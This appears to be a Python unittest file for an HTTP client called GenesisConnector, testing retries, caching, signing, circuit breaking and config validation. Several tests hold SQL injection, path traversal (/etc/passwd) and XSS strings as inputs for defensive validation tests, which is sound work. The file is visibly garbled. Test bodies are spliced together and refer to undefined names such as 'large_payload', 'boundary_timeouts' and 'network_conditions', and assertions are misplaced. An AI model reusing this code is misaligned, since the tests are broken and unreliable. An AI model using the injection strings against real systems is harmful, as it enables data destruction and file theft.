        """
        Test that reloading the connector's configuration updates its internal config to the new values.
        """
        new_config = {
            'api_key': 'new_key',
            'base_url': 'https://new.url',
            'timeout': 60
        }
        
        self.connector.reload_config(new_config)
        
        # Configuration should be updated
        self.assertEqual(self.connector.config, new_config)

    def test_metrics_collection(self):

        """
        Verifies that sending a request through the connector results in the collection of 'requests_sent' and 'response_time' metrics.
        """
        with patch('requests.post') as mock_post:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {'data': 'test'}
            mock_post.return_value = mock_response
            
            payload = {'message': 'test'}
            self.connector.send_request(payload)
            
            # Check that metrics were collected
            metrics = self.connector.get_metrics()
            self.assertIn('requests_sent', metrics)
            self.assertIn('response_time', metrics)

    def test_health_check_endpoint(self):

        """
        Tests that the health check endpoint returns a status of 'healthy' when the service responds with HTTP 200 and valid JSON.
        """
        with patch('requests.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {'status': 'healthy'}
            mock_get.return_value = mock_response
            
            health = self.connector.health_check()
            
            self.assertEqual(health['status'], 'healthy')

    def test_rate_limiting_handling(self):

        """
        Test that the connector raises a RuntimeError when an HTTP 429 response with a Retry-After header is received, verifying correct rate limiting handling.
        """
        with patch('requests.post') as mock_post:
            mock_response = Mock()
            mock_response.status_code = 429
            mock_response.headers = {'Retry-After': '1'}
            mock_post.return_value = mock_response
            
            payload = {'message': 'test'}
            
            with self.assertRaises(RuntimeError):
                self.connector.send_request(payload)

    def test_connection_pooling_behavior(self):
        """
        Verifies that the GenesisConnector reuses the same HTTP session for multiple requests when connection pooling is enabled.
        """
        with patch('requests.Session') as mock_session:
            mock_session_instance = Mock()
            mock_session.return_value = mock_session_instance
            
            connector = GenesisConnector(config={'use_session': True})
            
            # Make multiple requests
            for i in range(3):
                with patch.object(mock_session_instance, 'post') as mock_post:
                    mock_response = Mock()
                    mock_response.status_code = 200
                    mock_response.json.return_value = {'request': i}
                    mock_post.return_value = mock_response
                    
                    payload = {'message': f'test{i}'}
                    connector.send_request(payload)
            
            # Session should be reused
            mock_session.assert_called_once()

    def test_async_request_handling(self):
        """
        Tests that the GenesisConnector can handle asynchronous requests correctly if async support is implemented.
        
        This test mocks aiohttp to simulate an async HTTP request and verifies that the async request method returns the expected result. If async methods are not implemented or no event loop is available, the test is skipped.
        """
        async def async_test():
            """
            Tests the asynchronous request sending capability of GenesisConnector using mocked aiohttp.
            
            This test verifies that the async `send_request_async` method correctly sends a payload and processes the response when aiohttp is used, and gracefully skips if async support is not implemented.
            """
            with patch('aiohttp.ClientSession') as mock_session:
                mock_session_instance = Mock()
                mock_session.return_value.__aenter__.return_value = mock_session_instance
                
                mock_response = Mock()
                mock_response.status = 200
                mock_response.json = Mock(return_value={'async': True})
                mock_session_instance.post.return_value.__aenter__.return_value = mock_response
                
                connector = GenesisConnector(config={'async_mode': True})
                payload = {'message': 'async_test'}
                
                try:
                    result = await connector.send_request_async(payload)
                    self.assertEqual(result['async'], True)
                except AttributeError:
                    # Skip test if async methods not implemented
                    pass
        
        # Run async test if event loop is available
        try:
            loop = asyncio.get_event_loop()
            loop.run_until_complete(async_test())
        except RuntimeError:
            # Skip if no event loop
            pass

    def test_batch_request_processing(self):
        """
        Tests that the connector can process multiple requests in a batch and returns the expected results for each payload.
        
        Verifies that the batch request method returns a result for each input payload and that each result indicates successful batch processing. Skips the test if batch processing is not implemented.
        """
        with patch('requests.post') as mock_post:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {'batch': True}
            mock_post.return_value = mock_response
            
            payloads = [
                {'message': 'batch1'},
                {'message': 'batch2'},
                {'message': 'batch3'}
            ]
            
            try:
                results = self.connector.send_batch_requests(payloads)
                self.assertEqual(len(results), 3)
                for result in results:
                    self.assertEqual(result['batch'], True)
            except AttributeError:
                # Skip test if batch methods not implemented
                pass

    def test_webhook_validation(self):
        """
        Tests that the webhook signature validation correctly identifies valid and invalid signatures.
        
        Verifies that the connector's webhook signature validation method returns True for a correct signature and False for an incorrect one. Skips the test if the validation method is not implemented.
        """
        webhook_payload = {'event': 'test_event', 'data': {'key': 'value'}}
        secret = 'webhook_secret'
        
        # Generate expected signature
        import hmac
        import hashlib
        
        payload_str = json.dumps(webhook_payload)
        expected_signature = hmac.new(
            secret.encode(),
            payload_str.encode(),
            hashlib.sha256
        ).hexdigest()
        
        try:
            is_valid = self.connector.validate_webhook_signature(
                payload_str, expected_signature, secret
            )
            self.assertTrue(is_valid)
            
            # Test with invalid signature
            is_valid = self.connector.validate_webhook_signature(
                payload_str, 'invalid_signature', secret
            )
            self.assertFalse(is_valid)
        except AttributeError:
            # Skip test if webhook validation not implemented
            pass

    def test_circuit_breaker_functionality(self):
        """
        Tests that the circuit breaker pattern is correctly implemented by simulating repeated failures and verifying that further requests are blocked once the breaker is open.
        
        The test triggers multiple consecutive failures to open the circuit breaker and asserts that subsequent requests raise a RuntimeError. If the circuit breaker is not implemented, the test is skipped.
        """
        with patch('requests.post') as mock_post:
            # Simulate multiple failures to trigger circuit breaker
            mock_response = Mock()
            mock_response.status_code = 500
            mock_post.return_value = mock_response
            
            payload = {'message': 'test'}
            
            try:
                # Make requests until circuit breaker opens
                for i in range(10):
                    try:
                        self.connector.send_request(payload)
                    except Exception:
                        pass
                
                # Circuit breaker should now be open
                with self.assertRaises(RuntimeError):
                    self.connector.send_request(payload)
                    
            except AttributeError:
                # Skip test if circuit breaker not implemented
                pass

    def test_request_deduplication(self):
        """
        Verify that duplicate requests with the same idempotency key are deduplicated and only one HTTP request is sent.
        
        This test sends the same payload twice and asserts that the connector returns the same result for both calls without making multiple HTTP requests. If request deduplication is not implemented, the test is skipped.
        """
        with patch('requests.post') as mock_post:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {'dedup': True}
            mock_post.return_value = mock_response
            
            payload = {'message': 'test', 'idempotency_key': 'unique_key_123'}
            
            try:
                # Send the same request twice
                result1 = self.connector.send_request(payload)
                result2 = self.connector.send_request(payload)
                
                # Should get same result without making duplicate request
                self.assertEqual(result1, result2)
                # Should only make one actual HTTP request
                self.assertEqual(mock_post.call_count, 1)
            except AttributeError:
                # Skip test if deduplication not implemented
                pass

    def test_request_signing(self):
        """
        Tests that the connector correctly signs requests for enhanced security, verifies the presence of the signature header, and handles cases where request signing is not implemented.
        """
        with patch('requests.post') as mock_post:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {'signed': True}
            mock_post.return_value = mock_response
            
            payload = {'message': 'test'}
            signing_key = 'test_signing_key'
            
            try:
                result = self.connector.send_signed_request(payload, signing_key)
                self.assertEqual(result['signed'], True)
                
                # Verify signature header was added
                call_args = mock_post.call_args
                headers = call_args[1]['headers']
                self.assertIn('X-Signature', headers)
            except AttributeError:
                # Skip test if request signing not implemented
                pass

    def test_response_caching(self):
        """
        Tests that repeated calls to `get_cached_response` for the same endpoint return cached data and do not trigger additional HTTP requests.
        
        Skips the test if response caching is not implemented in the connector.
        """
        with patch('requests.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {'cached': True}
            mock_response.headers = {'Cache-Control': 'max-age=300'}
            mock_get.return_value = mock_response
            
            try:
                # First request should hit the API
                result1 = self.connector.get_cached_response('test_endpoint')
                self.assertEqual(result1['cached'], True)
                
                # Second request should use cache
                result2 = self.connector.get_cached_response('test_endpoint')
                self.assertEqual(result2['cached'], True)
                
                # Should only make one actual HTTP request
                self.assertEqual(mock_get.call_count, 1)
            except AttributeError:
                # Skip test if caching not implemented
                pass

    def test_request_tracing(self):
        """
        Verifies that request tracing captures and exposes trace information during a request for debugging and monitoring purposes.
        
        This test sends a request with tracing enabled and asserts that trace metadata such as request ID, start time, and end time are present in the connector's trace information. If tracing is not implemented, the test is skipped.
        """
        with patch('requests.post') as mock_post:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {'traced': True}
            mock_post.return_value = mock_response
            
            payload = {'message': 'test'}
            
            try:
                result = self.connector.send_request(payload, trace=True)
                self.assertEqual(result['traced'], True)
                
                # Check that tracing information was collected
                trace_info = self.connector.get_trace_info()
                self.assertIn('request_id', trace_info)
                self.assertIn('start_time', trace_info)
                self.assertIn('end_time', trace_info)
            except AttributeError:
                # Skip test if tracing not implemented
                pass

    def test_configuration_hot_reload(self):
        """
        Verifies that the connector can update its configuration at runtime without requiring a restart, using hot reload if available or falling back to regular reload.
        """
        original_config = {'api_key': 'old_key', 'base_url': 'https://old.url'}
        new_config = {'api_key': 'new_key', 'base_url': 'https://new.url'}
        
        connector = GenesisConnector(config=original_config)
        self.assertEqual(connector.config['api_key'], 'old_key')
        
        # Hot reload configuration
        try:
            connector.hot_reload_config(new_config)
            self.assertEqual(connector.config['api_key'], 'new_key')
            self.assertEqual(connector.config['base_url'], 'https://new.url')
        except AttributeError:
            # Fall back to regular reload if hot reload not available
            connector.reload_config(new_config)
            self.assertEqual(connector.config['api_key'], 'new_key')

    def test_memory_usage_monitoring(self):
        """
        Verifies that memory usage remains within acceptable limits during repeated payload formatting operations.
        """
        try:
            import psutil
            import os
            
            process = psutil.Process(os.getpid())
            initial_memory = process.memory_info().rss
            
            # Perform memory-intensive operations
            large_payloads = [
                {'data': 'x' * 1000000} for _ in range(10)  # 10MB of data
            ]
            
            for payload in large_payloads:
                formatted = self.connector.format_payload(payload)
                self.assertIsNotNone(formatted)
            
            current_memory = process.memory_info().rss
            memory_increase = current_memory - initial_memory
            
            # Memory increase should be reasonable (less than 100MB)
            self.assertLess(memory_increase, 100 * 1024 * 1024)
            
        except ImportError:
            # Skip test if psutil not available
            pass

    def test_security_headers_validation(self):
        """
        Verifies that the GenesisConnector includes the correct security-related headers in its requests when configured.
        
        Ensures that headers such as 'X-Content-Type-Options', 'X-Frame-Options', 'X-XSS-Protection', and 'Strict-Transport-Security' are present and set to their expected values.
        """
        security_headers = {
            'X-Content-Type-Options': 'nosniff',
            'X-Frame-Options': 'DENY',
            'X-XSS-Protection': '1; mode=block',
            'Strict-Transport-Security': 'max-age=31536000'
        }
        
        connector = GenesisConnector(config={
            'api_key': 'test_key',
            'security_headers': security_headers
        })
        
        headers = connector.get_headers()
        
        for security_header, expected_value in security_headers.items():
            self.assertIn(security_header, headers)
            self.assertEqual(headers[security_header], expected_value)

    def test_api_version_negotiation(self):
        """
        Tests that the connector correctly retrieves supported API versions and negotiates the requested version.
        
        Verifies that the list of supported versions includes expected values and that version negotiation returns the requested version when supported. Skips the test if version negotiation is not implemented.
        """
        with patch('requests.get') as mock_get:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {
                'supported_versions': ['1.0', '1.1', '2.0'],
                'default_version': '2.0'
            }
            mock_get.return_value = mock_response
            
            try:
                supported_versions = self.connector.get_supported_versions()
                self.assertIn('1.0', supported_versions)
                self.assertIn('2.0', supported_versions)
                
                # Test version negotiation
                negotiated_version = self.connector.negotiate_version('1.1')
                self.assertEqual(negotiated_version, '1.1')
            except AttributeError:
                # Skip test if version negotiation not implemented
                pass

    def test_error_recovery_mechanisms(self):
        """
        Tests the connector's ability to recover from various error scenarios during request sending.
        
        Simulates different exceptions (network errors, timeouts, invalid responses, server errors) and verifies whether the connector's recovery mechanisms handle or propagate them as expected.
        """
        with patch('requests.post') as mock_post:
            # Test different error scenarios and recovery
            error_scenarios = [
                (ConnectionError("Network unreachable"), True),
                (TimeoutError("Request timeout"), True),
                (ValueError("Invalid response"), False),
                (RuntimeError("Server error"), True)
            ]
            
            for error, should_recover in error_scenarios:
                with self.subTest(error=error.__class__.__name__):
                    mock_post.side_effect = error
                    
                    payload = {'message': 'test'}
                    
                    try:
                        result = self.connector.send_request_with_recovery(payload)
                        if should_recover:
                            self.assertIsNotNone(result)
                        else:
                            self.fail("Expected exception was not raised")
                    except AttributeError:
                        # Skip test if recovery mechanisms not implemented
                        pass
                    except Exception as e:
                        if should_recover:
                            self.fail(f"Recovery failed for {error.__class__.__name__}: {e}")

    def test_load_balancing_across_endpoints(self):
        """
        Verifies that the connector distributes requests across multiple endpoints using load balancing.
        
        Simulates multiple requests and checks that each request is processed successfully, ensuring requests are distributed as expected. Skips the test if load balancing is not implemented.
        """
        endpoints = [
            'https://api1.test.com',
            'https://api2.test.com',
            'https://api3.test.com'
        ]
        
        connector = GenesisConnector(config={
            'api_key': 'test_key',
            'endpoints': endpoints,
            'load_balancing': 'round_robin'
        })
        
        with patch('requests.post') as mock_post:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {'balanced': True}
            mock_post.return_value = mock_response
            
            payload = {'message': 'test'}
            
            try:
                # Make multiple requests to test load balancing
                for i in range(6):
                    result = connector.send_request(payload)
                    self.assertEqual(result['balanced'], True)
                
                # Should have distributed requests across endpoints
                self.assertEqual(mock_post.call_count, 6)
            except AttributeError:
                # Skip test if load balancing not implemented
                pass



class TestGenesisConnectorIntegration(unittest.TestCase):
    """
    Integration tests for GenesisConnector.
    These tests verify the interaction between components.
    """

    def setUp(self):

        """
        Sets up the integration test environment by creating a GenesisConnector instance with a test configuration.
        """
        self.connector = GenesisConnector(config={
            'api_key': 'test_key',
            'base_url': 'https://api.test.com',
            'timeout': 30
        })

    def test_full_request_lifecycle(self):

        """
        Simulates a complete request lifecycle by sending a payload through the connector and verifying a successful response.
        
        Asserts that the connector correctly processes a POST request and that the response contains the expected result.
        """
        with patch('requests.post') as mock_post:
            mock_response = Mock()
            mock_response.status_code = 200
            mock_response.json.return_value = {'result': 'success'}
            mock_post.return_value = mock_response
            
            payload = {'message': 'integration test'}
            result = self.connector.send_request(payload)
            
            self.assertEqual(result['result'], 'success')
            mock_post.assert_called_once()

    def test_connection_and_request_flow(self):

        """
        Tests that the connector can establish a connection and send a request, verifying that the expected response data is returned.
        """
        with patch('requests.get') as mock_get, \
             patch('requests.post') as mock_post:
            
            # Mock connection
            mock_get_response = Mock()
            mock_get_response.status_code = 200
            mock_get.return_value = mock_get_response
            
            # Mock request
            mock_post_response = Mock()
            mock_post_response.status_code = 200
            mock_post_response.json.return_value = {'data': 'test'}
            mock_post.return_value = mock_post_response
            
            # Test flow
            self.assertTrue(self.connector.connect())
            result = self.connector.send_request({'message': 'test'})
            
            self.assertEqual(result['data'], 'test')


class TestGenesisConnectorEdgeCases(unittest.TestCase):
    """
    Edge case tests for GenesisConnector.
    Testing framework: unittest with pytest enhancements
    """

    def setUp(self):

        """
        Initializes a GenesisConnector instance for edge case testing.
        """
        self.connector = GenesisConnector()


    def test_init_with_malformed_config_types(self):
        """
        Test that GenesisConnector initialization fails with malformed configuration types.
        
        Verifies that providing non-string or empty API keys and base URLs, or non-numeric timeout values, raises ValueError or TypeError.
        """
        malformed_configs = [
            {'api_key': 123, 'base_url': 'https://test.com'},  # Non-string api_key
            {'api_key': 'test', 'base_url': 123},  # Non-string base_url
            {'api_key': 'test', 'base_url': 'https://test.com', 'timeout': 'invalid'},  # Non-numeric timeout
            {'api_key': '', 'base_url': 'https://test.com'},  # Empty string api_key
            {'api_key': 'test', 'base_url': ''},  # Empty string base_url
        ]
        
        for config in malformed_configs:
            with self.subTest(config=config):
                with self.assertRaises((ValueError, TypeError)):
                    connector = GenesisConnector(config=config)
                    connector.validate_config(config)

    def test_init_with_unicode_config(self):
        """
        Test that GenesisConnector can be initialized with a configuration containing Unicode characters.
        """
        unicode_config = {
            'api_key': 'test_key_🔑',
            'base_url': 'https://api.tëst.com',
            'timeout': 30
        }
        
        connector = GenesisConnector(config=unicode_config)
        self.assertIsNotNone(connector)
        self.assertEqual(connector.config, unicode_config)

    @patch('requests.get')
    def test_connect_with_redirects(self, mock_get):
        """
        Test that the connect method correctly handles HTTP 302 redirects.
        
        Simulates an HTTP 302 response and verifies that the method returns a non-None result, indicating that redirects are processed as expected.
        """
        mock_response = Mock()
        mock_response.status_code = 302
        mock_response.headers = {'Location': 'https://new.location.com'}
        mock_get.return_value = mock_response
        
        result = self.connector.connect()
        
        # Should handle redirects appropriately
        self.assertIsNotNone(result)

    @patch('requests.get')
    def test_connect_with_ssl_errors(self, mock_get):
        """
        Test that connect() returns False when an SSL certificate error occurs during the connection attempt.
        """
        import ssl
        mock_get.side_effect = ssl.SSLError("SSL certificate verify failed")
        
        result = self.connector.connect()
        
        self.assertFalse(result)

    @patch('requests.get')
    def test_connect_with_dns_resolution_error(self, mock_get):
        """
        Test that connect() returns False when a DNS resolution error occurs.
        
        Simulates a DNS resolution failure by raising a socket.gaierror during the connection attempt and verifies that the connector handles the error gracefully.
        """
        import socket
        mock_get.side_effect = socket.gaierror("Name or service not known")
        
        result = self.connector.connect()
        
        self.assertFalse(result)

    @patch('requests.post')
    def test_send_request_with_binary_payload(self, mock_post):
        """
        Test that the connector can process and send a request with a large, binary-like payload, and handles formatting or memory errors gracefully.
        """
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'data': 'binary_processed'}
        mock_post.return_value = mock_response
        
        binary_payload = {
            'message': 'test',
            'large_field': 'x' * (1024 * 1024),  # 1MB string
            'large_list': list(range(10000)),
            'nested_large': {
                'data': ['item' * 100 for _ in range(100)]
            }
        }
        
        try:
            formatted = self.connector.format_payload(large_payload)
            self.assertIsNotNone(formatted)
        except (MemoryError, ValueError) as e:
            # Should handle gracefully
            self.assertIsInstance(e, (MemoryError, ValueError))

    def test_malformed_json_responses(self):
        """
        Tests that the connector correctly detects and handles various malformed JSON responses, ensuring appropriate errors are raised or handled for incomplete, syntactically invalid, or otherwise problematic JSON payloads.
        """
        malformed_responses = [
            '{"incomplete":',
            '{"trailing_comma":,}',
            '{"duplicate_key":"value1","duplicate_key":"value2"}',
            '{"unescaped_string":"value with "quotes""}',
            '{"number_overflow":999999999999999999999999999999999}',
            '{"invalid_unicode":"\\uXXXX"}',
            '{trailing_data} extra',
            '{"mixed_types":{"string":"value","number":123,"array":[1,2,3],"object":{"nested":true}}}',
        ]
        

        self.assertEqual(result, {'data': 'binary_processed'})

    @patch('requests.post')
    def test_send_request_with_nested_payload(self, mock_post):
        """
        Test sending a deeply nested payload using the connector and verify correct response processing and timeout validation.
        
        Verifies that the connector can handle nested payloads, processes the response as expected, and validates configuration timeouts, raising a ValueError for infinite timeout values.
        """
        mock_response = Mock()
        mock_response.status_code = 200
        mock_response.json.return_value = {'data': 'nested_processed'}
        mock_post.return_value = mock_response
        
        for timeout in boundary_timeouts:
            with self.subTest(timeout=timeout):
                config = {
                    'api_key': 'test_key',
                    'base_url': 'https://test.com',
                    'timeout': timeout
                }
                
                if timeout == float('inf'):
                    with self.assertRaises(ValueError):
                        self.connector.validate_config(config)
                else:
                    result = self.connector.validate_config(config)
                    self.assertTrue(result)

    def test_special_characters_in_headers(self):
        """
        Test that the GenesisConnector correctly encodes and processes HTTP headers containing special characters, whitespace, Unicode, and control characters.
        """
        special_headers = {
            'X-Custom-Header': 'value with spaces',
            'X-Unicode-Header': 'café',
            'X-Special-Chars': '!@#$%^&*()',
            'X-Quotes': 'value with "quotes"',
            'X-Newlines': 'value\nwith\nnewlines',
            'X-Tabs': 'value\twith\ttabs',
        }
        
        connector = GenesisConnector(config={
            'api_key': 'test_key',
            'custom_headers': special_headers
        })
        

        self.assertEqual(result, {'data': 'nested_processed'})

    @patch('requests.post')
    def test_send_request_with_circular_reference(self, mock_post):
        """
        Test that sending a payload containing a circular reference raises a ValueError or TypeError.
        
        Ensures the connector detects and rejects payloads that cannot be serialized due to circular references.
        """
        # Create circular reference
        payload = {'message': 'test'}
        payload['self'] = payload
        
        # Headers should be properly encoded/escaped
        for key, value in special_headers.items():
            self.assertIn(key, headers)

    @patch('requests.post')
    def test_send_request_with_extremely_large_payload(self, mock_post):
        """
        Test that sending an extremely large payload triggers a RuntimeError when the server returns HTTP 413 (Payload Too Large).
        
        Verifies that the connector raises an error if the payload size exceeds server limits.
        """
        mock_response = Mock()
        mock_response.status_code = 413  # Payload too large
        mock_post.return_value = mock_response
        
        large_payload = {
            'message': 'x' * 1000000,  # 1MB string
            'large_list': list(range(100000))
        }
        
        with self.assertRaises(RuntimeError):
            self.connector.send_request(large_payload)

    def test_validate_config_with_sql_injection_attempts(self):
        """
        Test that validate_config detects and rejects configuration values containing SQL injection patterns by raising ValueError or returning a boolean result without executing injected code.
        """
        malicious_configs = [
            {'api_key': "'; DROP TABLE users; --", 'base_url': 'https://test.com'},
            {'api_key': 'test', 'base_url': "https://test.com'; DELETE FROM config; --"},
            {'api_key': 'test\x00admin', 'base_url': 'https://test.com'},
        ]
        
        def modify_config(connector, config_updates):
            """
            Applies a series of configuration updates to a connector, validating each update for correctness and security.
            
            Parameters:
                connector: The connector instance to validate configurations against.
                config_updates (iterable): An iterable of configuration updates to be validated.
            
            Each configuration update is validated using the connector's `validate_config` method. If validation fails due to malicious input, the exception is suppressed.
            """
            for update in config_updates:
                try:

                    result = self.connector.validate_config(config)
                    # If validation passes, ensure no injection occurred
                    self.assertIsInstance(result, bool)
                except ValueError:
                    # Expected for malicious input
                    pass

    def test_validate_config_with_path_traversal_attempts(self):
        """
        Tests that validate_config raises ValueError when the API key or base URL contains path traversal patterns.
        """
        malicious_configs = [
            {'api_key': '../../../etc/passwd', 'base_url': 'https://test.com'},
            {'api_key': 'test', 'base_url': 'https://test.com/../admin'},
            {'api_key': 'test', 'base_url': 'file:///etc/passwd'},
        ]
        
        for config in malicious_configs:
            with self.subTest(config=config):
                with self.assertRaises(ValueError):
                    self.connector.validate_config(config)

    def test_validate_config_with_xss_attempts(self):
        """
        Verify that configuration validation raises a ValueError when the API key or base URL contains XSS attack patterns.
        """
        malicious_configs = [
            {'api_key': '<script>alert("xss")</script>', 'base_url': 'https://test.com'},
            {'api_key': 'test', 'base_url': 'https://test.com<script>alert(1)</script>'},
            {'api_key': 'javascript:alert(1)', 'base_url': 'https://test.com'},
        ]
        
        for config in malicious_configs:
            with self.subTest(config=config):
                with self.assertRaises(ValueError):
                    self.connector.validate_config(config)

    @patch('requests.get')
    def test_get_status_with_timeout_variations(self, mock_get):
        """
        Verify that `get_status` returns a status of 'timeout' when timeout-related exceptions occur during status retrieval.
        
        Simulates different timeout and connection error exceptions to ensure the connector reports a 'timeout' status in each case.
        """
        import socket
        timeout_scenarios = [
            socket.timeout("Connection timeout"),
            TimeoutError("Request timeout"),
            ConnectionError("Connection reset"),
        ]
        
        for exception in timeout_scenarios:
            with self.subTest(exception=exception):
                mock_get.side_effect = exception
                
                status = self.connector.get_status()
                
                # Should handle timeouts gracefully
                self.assertIn('status', status)
                self.assertEqual(status['status'], 'timeout')

    def test_format_payload_with_datetime_objects(self):
        """
        Verify that the payload formatter correctly serializes `datetime`, `date`, and `time` objects into supported string formats.
        """
        from datetime import datetime, date, time
        
        payload = {
            'timestamp': datetime.now(),
            'date': date.today(),
            'time': time(14, 30, 59),
            'message': 'test'
        }
        
        formatted = self.connector.format_payload(payload)
        
        # Should serialize datetime objects properly
        self.assertIn('timestamp', formatted)
        self.assertIn('date', formatted)
        self.assertIn('time', formatted)

    def test_format_payload_with_decimal_and_complex_numbers(self):
        """
        Tests that the payload formatting method serializes decimal, complex, and float numeric types without raising errors.
        """
        from decimal import Decimal
        
        payload = {
            'decimal_value': Decimal('123.456'),
            'complex_value': complex(1, 2),
            'float_value': 123.456,
            'message': 'test'
        }
        
        formatted = self.connector.format_payload(payload)
        
        # Should handle numeric types properly
        self.assertIn('decimal_value', formatted)
        self.assertIn('complex_value', formatted)
        self.assertIn('float_value', formatted)

    def test_format_payload_with_custom_objects(self):
        """
        Test that the payload formatting method serializes custom objects using their string representation.
        """
        class CustomObject:
            def __init__(self, value):
                """
                Initialize the instance with the given value.
                
                Parameters:
                    value: The value to assign to the instance.
                """
                self.value = value
            
            def __str__(self):
                """
                Return a string representation of the object in the format 'CustomObject(value)'.
                """
                return f"CustomObject({self.value})"
        
        payload = {
            'custom_obj': CustomObject("test"),
            'message': 'test'
        }
        
        for thread in threads:
            thread.join()
        
        # Should not crash, final config should be valid
        final_config = self.connector.config
        self.assertIsNotNone(final_config)


    @patch('requests.post')
    def test_retry_mechanism_with_exponential_backoff(self, mock_post):
        """
        Test that the retry mechanism uses exponential backoff delays and raises a RuntimeError after exceeding the maximum number of retries.
        
        Verifies that each retry delay increases exponentially and that a RuntimeError is raised when all retry attempts fail.
        """
        mock_response = Mock()
        mock_response.status_code = 500
        mock_post.return_value = mock_response
        
        payload = {'message': 'test'}
        
        with patch('time.sleep') as mock_sleep:
            with self.assertRaises(RuntimeError):
                self.connector.send_request_with_retry(payload, max_retries=3)
            
            # Verify exponential backoff pattern
            sleep_calls = [call.args[0] for call in mock_sleep.call_args_list]
            self.assertEqual(len(sleep_calls), 3)
            # Each delay should be longer than the previous
            for i in range(1, len(sleep_calls)):
                self.assertGreater(sleep_calls[i], sleep_calls[i-1])

    @patch('requests.post')
    def test_retry_mechanism_with_jitter(self, mock_post):
        """
        Test that the retry mechanism applies randomized jitter to backoff delays on repeated server errors.
        
        Simulates consecutive HTTP 500 responses and verifies that jitter is introduced to sleep intervals between retries. Expects a RuntimeError after exceeding the maximum number of retries.
        """
        mock_response = Mock()
        mock_response.status_code = 500
        mock_post.return_value = mock_response
        
        for i in range(100):
            connector = GenesisConnector(config={'api_key': f'key_{i}'})
            connectors.append(connector)
            weak_refs.append(weakref.ref(connector))
        

        with patch('time.sleep') as mock_sleep:
            with patch('random.random', return_value=0.5):
                with self.assertRaises(RuntimeError):
                    self.connector.send_request_with_retry(payload, max_retries=2)
                
                # Sleep should be called with jitter
                self.assertTrue(mock_sleep.called)

    def test_parse_response_with_edge_case_json(self):
        """
        Verify that the response parser correctly handles JSON strings with edge case structures, including empty objects, arrays, nulls, booleans, numbers, escaped characters, and Unicode content.
        """
        edge_cases = [
            '{"empty_object": {}}',
            '{"empty_array": []}',
            '{"null_value": null}',
            '{"boolean_true": true, "boolean_false": false}',
            '{"number_zero": 0, "number_negative": -123}',
            '{"string_with_escapes": "Hello\\nWorld\\t!"}',
            '{"unicode": "测试 🚀 emoji"}',
        ]
        
        for json_str in edge_cases:
            with self.subTest(json_str=json_str):
                parsed = self.connector.parse_response(json_str)
                self.assertIsInstance(parsed, dict)

    def test_parse_response_with_large_json(self):
        """
        Verify that the connector accurately parses a large JSON string containing 10,000 key-value pairs.
        
        Ensures that all keys and values are present in the parsed result, confirming correct handling of large JSON payloads.
        """
        large_dict = {f'key_{i}': f'value_{i}' for i in range(10000)}
        large_json = json.dumps(large_dict)
        
        parsed = self.connector.parse_response(large_json)
        
        self.assertEqual(len(parsed), 10000)
        self.assertEqual(parsed['key_0'], 'value_0')
        self.assertEqual(parsed['key_9999'], 'value_9999')

    def test_log_request_with_various_log_levels(self):
        """
        Test that the log_request method logs payloads at all supported logging levels under various network conditions without raising errors.
        """
        log_levels = [
            ('DEBUG', logging.DEBUG),
            ('INFO', logging.INFO),
            ('WARNING', logging.WARNING),
            ('ERROR', logging.ERROR),
        ]
        
        for condition in network_conditions:
            with self.subTest(condition=condition):
                with patch('requests.post') as mock_post:
                    def simulate_network(*args, **kwargs):
                        """
                        Simulates a network request with configurable delay and error rate for testing purposes.
                        
                        Parameters:
                            delay (float): The simulated network delay in seconds, provided via the 'delay' key in kwargs or args.
                            error_rate (float): The probability (0.0 to 1.0) of raising a simulated ConnectionError, provided via the 'error_rate' key in kwargs or args.
                        
                        Returns:
                            Mock: A mock response object with status_code 200 and a JSON payload indicating simulation.
                        
                        Raises:
                            ConnectionError: If a simulated network error occurs based on the specified error rate.
                        """
                        import time
                        import random
                        
                        # Simulate network delay
                        time.sleep(condition['delay'])
                        
                        # Simulate network errors
                        if random.random() < condition['error_rate']:
                            raise ConnectionError("Simulated network error")
                        
                        mock_response = Mock()
                        mock_response.status_code = 200
                        mock_response.json.return_value = {'simulated': True}
                        return mock_response
                    
                    mock_post.side_effect = simulate_network
                    

                    # Verify logger was called appropriately
                    self.assertTrue(mock_logger.called)

    def test_log_request_with_pii_data(self):
        """
        Test that logging a request containing PII fields results in sensitive information being redacted from the log output.
        """
        pii_fields = [
            'ssn', 'social_security_number', 'credit_card', 'phone_number',
            'email', 'address', 'name', 'birth_date', 'license_number'
        ]
        
        for field in pii_fields:
            with self.subTest(field=field):
                payload = {
                    'message': 'test',
                    field: 'sensitive_data_here'
                }
                
                with patch('logging.info') as mock_log:
                    self.connector.log_request(payload)
                    
                    # Verify PII was redacted
                    logged_message = mock_log.call_args[0][0]
                    self.assertNotIn('sensitive_data_here', logged_message)

    def test_get_headers_with_custom_user_agent(self):
        """
        Test that a custom User-Agent header is included in the connector's headers when specified in the configuration.
        """
        custom_config = {
            'api_key': 'test_key',
            'user_agent': 'CustomConnector/1.0'
        }
        
        connector = GenesisConnector(config=custom_config)
        headers = connector.get_headers()
        
        self.assertIn('User-Agent', headers)
        self.assertEqual(headers['User-Agent'], 'CustomConnector/1.0')

    def test_get_headers_with_additional_headers(self):
        """
        Verify that custom headers specified in the configuration are included in the headers returned by the connector.
        """
        custom_config = {
            'api_key': 'test_key',
            'additional_headers': {
                'X-Custom-Header': 'custom_value',
                'X-Request-ID': 'req_123'
            }
        }
        
        connector = GenesisConnector(config=custom_config)
        headers = connector.get_headers()
        
        self.assertIn('X-Custom-Header', headers)
        self.assertIn('X-Request-ID', headers)
        self.assertEqual(headers['X-Custom-Header'], 'custom_value')

    def test_close_connection_with_pending_requests(self):
        """
        Test that closing the connector with pending requests handles resource exhaustion gracefully and does not leave threads hanging.
        """
        with patch('requests.post') as mock_post:
            mock_post.side_effect = OSError("Too many open files")
            
            payload = {'message': 'resource_test'}
            

            # Should handle gracefully
            self.assertIsNotNone(result)
            request_thread.join(timeout=1)

    def test_context_manager_with_exception(self):
        """
